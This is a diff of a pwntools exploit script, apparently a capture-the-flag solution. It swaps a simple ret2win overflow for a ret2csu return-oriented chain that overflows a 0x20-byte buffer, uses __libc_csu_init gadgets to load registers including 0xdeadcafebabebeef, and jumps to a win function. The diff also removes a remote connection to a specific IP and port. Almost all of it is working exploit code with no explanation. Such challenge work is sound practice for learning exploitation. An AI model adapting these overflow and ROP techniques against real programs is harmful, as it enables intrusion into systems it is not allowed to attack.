@@ -12,23 +12,33 @@ if local:
 	# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)
 	# libc = ELF('/lib/i386-linux-gnu/libc.so.6',checksec=False)
 
-else:
-	cn = remote('117.78.27.105', 30403)
-	# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)
-	pass
 
-
-def z(a=''):
-	if local:
-		gdb.attach(cn,a)
-		if a == '':
-			raw_input()
-
+init_add = 0x0600E10
+rop1_add = 0x0400896 #add rsp, 8 ; pop rbx ; pop rbp ; r12 r13 r14 r15 ret
+rop2_add = 0x0400880 #mov rdx, r15 ; mov rsi, r14 ; mov edi, r13d ; call qword ptr [r12+rbx*8]
+# z('b*0x04006E2\nc')
 win_add = 0x04007B1
 cn.recvuntil('beef')
-z('b*0x04007AF\nc')
 
-payload = 'A'*0x20+ p64(0) + p64(win_add)
+payload = 'A'*0x20
+payload += p64(0) # rbp
+payload += p64(rop1_add) #ret
+payload += p64(0) #padding
+payload += p64(0) #rbx
+payload += p64(1) #rbp
+payload += p64(init_add) #r12
+payload += p64(0x0601060) #r13
+payload += p64(0) #r14
+payload += p64(0xdeadcafebabebeef) #r15
+payload += p64(rop2_add) #ret
+payload += p64(0) #padding
+payload += p64(0) #rbx
+payload += p64(0) #rbp
+payload += p64(0) #r12
+payload += p64(0) #r13
+payload += p64(0) #r14
+payload += p64(0) #r15
+payload += p64(win_add) #ret
 
 cn.sendline(payload)
 
